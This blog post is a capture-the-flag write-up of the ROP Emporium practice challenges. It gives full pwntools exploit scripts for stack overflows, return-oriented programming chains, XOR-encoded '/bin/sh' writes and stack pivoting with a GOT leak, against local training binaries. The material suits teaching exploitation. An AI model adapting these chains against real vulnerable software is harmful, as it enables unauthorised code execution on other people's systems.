---
layout: post
title: "ROP Emporium Write Up"
---

# 0x00 Abstartc

It has been a long time since I stopped doing pwn exercises. I solved some basic challenges of [ROP Emporium](https://ropemporium.com) this time, which is a good place to practice your ability constructing write4, xor or pivot ROP chain. I believe that you should know the usage of [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) before reading this write up.

<!-- more -->

# 0x01 ret2win

Because there is a backdoor system function in ret2win function, overwriting return address is the easy solution on x86 and x64 architecture. 

## ret2win32

```python
from pwn import *

p = process("./ret2win32")
p.recvuntil("> ")
ret2win_address = 0x08048659
payload = "A"*(0x28+4) + p32(ret2win_address)
p.sendline(payload)
p.interactive()
```

## ret2win64

```python
from pwn import *

p = process("./ret2win")
p.recvuntil("> ")
ret2win_address = 0x0000000000400811
payload = "A"*(0x20+8) + p64(ret2win_address)
p.sendline(payload)
p.interactive()
```

# 0x02 split

As mentioned in the introduction, the ret2win function was splitted into system call in usefulFunction and unobvious `cat flag` string in .data segment. Shift+F12 in IDA works it out easily. The difference between 32bit and 64bit binary is the function calling convention, one is the stack, the other is rdi, rsi, rdx, rcx, r8, r9 on Linux, which makes gadget finding different.

## split32

```python
from pwn import *

p = process("./split32")
p.recvuntil("> ")
system_plt_address = 0x08048430
usefulString_address = 0x0804A030
payload = "A"*(0x28+4) + p32(system_plt_address) + "B"*4 + p32(usefulString_address)
p.sendline(payload)
p.interactive()
```

## split64

```python
from pwn import *

p = process("./split")
system_plt_address = 0x00000000004005E0
usefulString_address = 0x0000000000601060
pop_rdi_ret_address = 0x0000000000400883
payload = "A"*(0x20+8) + p64(pop_rdi_ret_address) + p64(usefulString_address) + p64(system_plt_address)
p.sendline(payload)
p.interactive()
```

# 0x03 callme

Through RE, the callme problem focuses on calling conventions. We could call callme_one(), callme_two() and callme_three() with correct arguments 1,2,3. Just so so.

## callme32

```python
from pwn import *

p = process("./callme32")
p.recvuntil("> ")
callme_one_plt_address = 0x080485C0
callme_two_plt_address = 0x08048620
callme_thress_plt_address = 0x080485B0
pop_pop_ret_address = 0x080488a9
payload = flat(["A"*(0x28+4), callme_one_plt_address, pop_pop_ret_address, 1, 2, 3, callme_two_plt_address, pop_pop_ret_address, 1, 2, 3, callme_thress_plt_address, pop_pop_ret_address, 1, 2, 3])
p.sendline(payload)
p.interactive()
```

## callme64

```python
from pwn import *

p = process("./callme")
callme_one_plt_address = 0x0000000000401850
callme_two_plt_address = 0x0000000000401870
callme_thress_plt_address = 0x0000000000401810
pop_pop_pop_ret_address = 0x0000000000401ab0
payload = flat(["A"*(0x20+8), pop_pop_pop_ret_address, 1, 2, 3, callme_one_plt_address, pop_pop_pop_ret_address, 1, 2, 3, callme_two_plt_address, pop_pop_pop_ret_address, 1, 2, 3, callme_thress_plt_address], word_size=64)
p.sendline(payload)
p.interactive()
```

# 0x04 write4

This challenge doesn't give us useful string, we have to write it in memory ourselves. I attempted to call fgets@plt to construct an arbitrary write primitive, but the third argument stream is hard to fake. So I should search some gadgets like `mov [reg], reg` by using ROPgadget：

```shell
$ ROPgadget --binary write432 --only "mov|pop|ret"
Gadgets information
============================================================
0x08048670 : mov dword ptr [edi], ebp ; ret
0x080486da : pop edi ; pop ebp ; ret

$ ROPgadget --binary write4 --only "mov|pop|ret"
Gadgets information
============================================================
0x0000000000400820 : mov qword ptr [r14], r15 ; ret
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400893 : pop rdi ; ret
```

By the way, the destination to write is a stable and writable address in memory, vmmap may help you:

```shell
gdb-peda$ vmmap 
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/home/larry/rop/write4/write4
0x00600000         0x00601000         r--p	/home/larry/rop/write4/write4
0x00601000         0x00602000         rw-p	/home/larry/rop/write4/write4
```

## write432

```python
from pwn import *

p = process("./write432")
pop_pop_ret_address = 0x080486da
mov_ret_address = 0x08048670
write_start_address = 0x804a0f0
system_plt_address = 0x08048430
payload = flat(["A"*(0x28+4), pop_pop_ret_address, write_start_address, "/bin", mov_ret_address, pop_pop_ret_address, write_start_address+4, "/sh\x00", mov_ret_address, system_plt_address, "B"*4, write_start_address])
p.sendline(payload)
p.interactive()
```

## write464

```python
from pwn import *

p = process("./write4")
pop_pop_ret_address = 0x0000000000400890
mov_ret_address = 0x0000000000400820
write_start_address = 0x006010f0
system_plt_address = 0x00000000004005E0
pop_rdi_ret = 0x0000000000400893
payload = flat(["A"*(0x20+8), pop_pop_ret_address, write_start_address, "/bin/sh\x00", mov_ret_address, pop_rdi_ret, write_start_address, system_plt_address], word_size=64)
p.sendline(payload)
p.interactive()
```

# 0x05 badchars

Just like write4 problem, `cat flag` string shouldn't contain badchars which are `b i c / <space> f n s` in checkBadchars function. After reading gadgets and introduction we have, we can use the write4 gadget to write encoded string and xor gadget to decode. The first thing we should consider is to pick the xor char. Small script in hand:

```python
badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
sh = "/bin/sh\x00"

for i in xrange(256):
    flag = True
    new_sh = "".join([chr(i^ord(sh[x])) for x in xrange(len(sh))])
    for b in badchars:
        if chr(b) in new_sh:
            flag = False
    if flag:
        print str(i) + ":" + repr(new_sh.encode('hex'))
```

Because xor gadget xors only one byte every time, the for loop is also in our hand.

## badchars32

```python
from pwn import *

p = process("./badchars32")

# 0x08048899 : pop esi ; pop edi ; ret
pop_pop_ret_sd_address = 0x08048899
# 0x08048893 : mov dword ptr [edi], esi ; ret
mov_ret_address = 0x08048893
# 0x08048896 : pop ebx ; pop ecx ; ret
pop_pop_ret_bc_address = 0x08048896
# 0x08048890 : xor byte ptr [ebx], cl ; ret
xor_ret_address = 0x08048890
# "".join([chr(2^ord(sh[i]) for i in xrange(len("/bin/sh\x00"))])
sh_part_one = 0x2d606b6c
sh_part_two = 0x2d716a02
write_start_address = 0x0804a0f0
system_plt_address = 0x080484E0

payload = ""
payload += "A" * (0x28+4)
payload += p32(pop_pop_ret_sd_address)
payload += p32(sh_part_one, endianness="big")
payload += p32(write_start_address)
payload += p32(mov_ret_address)
payload += p32(pop_pop_ret_sd_address)
payload += p32(sh_part_two, endianness="big")
payload += p32(write_start_address+4)
payload += p32(mov_ret_address)
for i in xrange(8):
    payload += p32(pop_pop_ret_bc_address)
    payload += p32(write_start_address+i)
    payload += p32(2)
    payload += p32(xor_ret_address)
payload += p32(system_plt_address)
payload += "B" * 4
payload += p32(write_start_address)

p.sendline(payload)
p.interactive()
```

## badchars64

```python
from pwn import *

p = process("./badchars")

# 0x0000000000400b3b : pop r12 ; pop r13 ; ret
pop_pop_ret_23_address = 0x0000000000400b3b
# 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
mov_ret_address = 0x0000000000400b34
# 0x0000000000400b40 : pop r14 ; pop r15 ; ret
pop_pop_ret_45_address = 0x0000000000400b40
# 0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
xor_ret_address = 0x0000000000400b30
# 0x0000000000400b39 : pop rdi ; ret
pop_ret_address = 0x0000000000400b39
# "".join([chr(2^ord(sh[i]) for i in xrange(len("/bin/sh\x00"))]) 
sh = 0x2d606b6c2d716a02
write_start_address = 0x006010f0
system_plt_address = 0x00000000004006F0

payload = ""
payload += "A" * (0x20+8)
payload += p64(pop_pop_ret_23_address)
payload += p64(sh, endianness="big")
payload += p64(write_start_address)
payload += p64(mov_ret_address)
for i in xrange(8):
    payload += p64(pop_pop_ret_45_address)
    payload += p64(2)
    payload += p64(write_start_address+i)
    payload += p64(xor_ret_address)
payload += p64(pop_ret_address)
payload += p64(write_start_address)
payload += p64(system_plt_address)

p.sendline(payload)
p.interactive()
```

# 0x06 fluff

In this challenge, we should use other gadgets to write4. By staring at the gadget, I found the interesting rop chain:

```shell
$ ROPgadget --binary fluff32 
Gadgets information
============================================================
0x08048697 : xor byte ptr [ecx], bl ; ret
0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
0x080483e1 : pop ebx ; ret
```

With the feature `xx xor 0 = xx`, the write4 chain is still there.

## fluff32

```python
from pwn import *

p = process("./fluff32")

# 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
xor_edx_ret_address = 0x08048671
# 0x080483e1 : pop ebx ; ret
pop_ebx_ret_address = 0x080483e1
# 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
xor_edx_ebx_ret_address = 0x0804867b
# 0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
xchg_edx_ecx_ret_address = 0x08048689
# 0x080488ba : inc ecx ; ret
inc_ecx_ret_address = 0x080488ba
# 0x08048697 : xor byte ptr [ecx], bl ; ret
write_one_byte_address = 0x08048697

sh = "/bin/sh\x00"
write_start_address = 0x0804a0f0
system_plt_address = 0x08048430

payload = ""
payload += "A" * (0x28+4)
payload += p32(xor_edx_ret_address)
payload += "B" * 4
payload += p32(pop_ebx_ret_address)
payload += p32(write_start_address)
payload += p32(xor_edx_ebx_ret_address)
payload += "B" * 4
payload += p32(xchg_edx_ecx_ret_address)
payload += "B" * 4
for i in xrange(len(sh)):
    payload += p32(pop_ebx_ret_address)
    payload += p32(ord(sh[i]))
    payload += p32(write_one_byte_address)
    payload += p32(inc_ecx_ret_address)
payload += p32(system_plt_address)
payload += "C" * 4
payload += p32(write_start_address)

p.sendline(payload)
p.interactive()
```

## fluff64

The default output of ROPgadget couldn't help us find the useful gadget in 64 bit binary, but the [depth](http://www.giantbranch.cn/2017/12/18/rop%20emporium%20challenges%20wp/) optarg could solve it. Moreover, writing 8 bytes once time in a gadget increases the utilization of stack.

```python
from pwn import *

p = process("./fluff")

# 0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
xor_r11_r11 = 0x0000000000400822
# 0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
pop_r12 = 0x0000000000400832
# 0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
xor_r11_r12 = 0x000000000040082f
# 0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
xchg_r11_r10 = 0x0000000000400840
# 0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
write_eight_bytes = 0x000000000040084e
# 0x00000000004008c3 : pop rdi ; ret
pop_rdi = 0x00000000004008c3

write_start_address = 0x006010f0
system_plt_address = 0x00000000004005E0

payload = ""
payload += "A" * (0x20+8)
payload += p64(xor_r11_r11)
payload += "B" * 8
payload += p64(pop_r12)
payload += p64(write_start_address)
payload += p64(xor_r11_r12)
payload += "B" * 8
payload += p64(xchg_r11_r10)
payload += "B" * 8
payload += p64(xor_r11_r11)
payload += "B" * 8
payload += p64(pop_r12)
payload += "/bin/sh\x00"
payload += p64(xor_r11_r12)
payload += "B" * 8
payload += p64(write_eight_bytes)
payload += "B" * 8
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(write_start_address)
payload += p64(system_plt_address)

p.sendline(payload)
p.interactive()
```

# 0x07 pivot

When the stack space we overflow is small, we should use the stack pivot technique that we move our stack pointer to the controllable address and continue the rop chain. Actually, there are usefulGadgets in the binary file:

```
.text:080488C0                 public usefulGadgets
.text:080488C0 usefulGadgets:
.text:080488C0                 pop     eax
.text:080488C1                 retn
.text:080488C2 ; ---------------------------------------------------------------------------
.text:080488C2                 xchg    eax, esp
.text:080488C3                 retn
.text:080488C4 ; ---------------------------------------------------------------------------
.text:080488C4                 mov     eax, [eax]
.text:080488C6                 retn
.text:080488C7 ; ---------------------------------------------------------------------------
.text:080488C7                 add     eax, ebx
.text:080488C9                 retn
.text:080488C9 ; ---------------------------------------------------------------------------
```

With the heap address author leaks to us, we could pivot there by using eax register. The address of ret2win function in libpivot.so is ASLRed. I could get the actual address of 0x0000077C throught eax if there wasn't printf call in foothold_function. So the only way to leak address is to use `mov eax [eax]` gadget to read the got table. Don't forget that the actual address only can be got after the function was called once beacuse of lazy binding.

## pivot32

```python
import re
from pwn import *

p = process("./pivot32")
#gdb.attach(p)
pivot_address = int(re.search(r"0x.*?\b", p.recvuntil("> ")).group(), 16)

# 0x080488c0 : pop eax ; ret
pop_eax = 0x080488c0
# 0x080488c4 : mov eax, dword ptr [eax] ; ret
mov_eax = 0x080488c4
# 0x08048571 : pop ebx ; ret
pop_ebx = 0x08048571
# 0x080488c7 : add eax, ebx ; ret
add_eax_ebx = 0x080488c7
# 0x080486a3 : call eax
call_eax = 0x080486a3

foothold_got_address = 0x0804A024
foothold_plt_address = 0x080485F0
ebx_value = 0x00000967 - 0x00000770

stage_two = ""
stage_two += "B" * 32
stage_two += p32(foothold_plt_address)
stage_two += p32(pop_eax)
stage_two += p32(foothold_got_address)
stage_two += p32(mov_eax)
stage_two += p32(pop_ebx)
stage_two += p32(ebx_value)
stage_two += p32(add_eax_ebx)
stage_two += p32(call_eax)
p.sendline(stage_two)

p.recvuntil("> ")
# 0x080488c2 : xchg eax, esp ; ret
xchg_eax_esp = 0x080488c2

stage_one = ""
stage_one += "A" * (0x28+4)
stage_one += p32(pop_eax)
stage_one += p32(pivot_address+32)
stage_one += p32(xchg_eax_esp)
p.sendline(stage_one)
p.interactive()
```

## pivot64

```python
import re
from pwn import *

p = process("./pivot")
pivot_address = int(re.search(r"0x.*?\b", p.recvuntil("> ")).group(), 16)

# 0x0000000000400b00 : pop rax ; ret
pop_rax = 0x0000000000400b00
# 0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
mov_rax = 0x0000000000400b05
# 0x0000000000400900 : pop rbp ; ret
pop_rbp = 0x0000000000400900
# 0x0000000000400b09 : add rax, rbp ; ret
add_rax_rbp = 0x0000000000400b09
# 0x000000000040098e : call rax
call_rax = 0x000000000040098e

foothold_got_address = 0x0000000000602048
foothold_plt_address = 0x0000000000400850
rbp_value = 0x0000000000000ABE - 0x0000000000000970

stage_two = ""
stage_two += p64(foothold_plt_address)
stage_two += p64(pop_rax)
stage_two += p64(foothold_got_address)
stage_two += p64(mov_rax)
stage_two += p64(pop_rbp)
stage_two += p64(rbp_value)
stage_two += p64(add_rax_rbp)
stage_two += p64(call_rax)
p.sendline(stage_two)

p.recvuntil("> ")
# 0x0000000000400b02 : xchg rax, rsp ; ret
xchg_rax_rsp = 0x0000000000400b02

stage_one = ""
stage_one += "A" * (0x20+8)
stage_one += p64(pop_rax)
stage_one += p64(pivot_address)
stage_one += p64(xchg_rax_rsp)
p.sendline(stage_one)
p.interactive()
```

# 0x08 Conclusion

1. What architecture you exploit affects what calling convention in mind.
2. What looks small could be creatively big.
3. Learn it, practice it, use it.
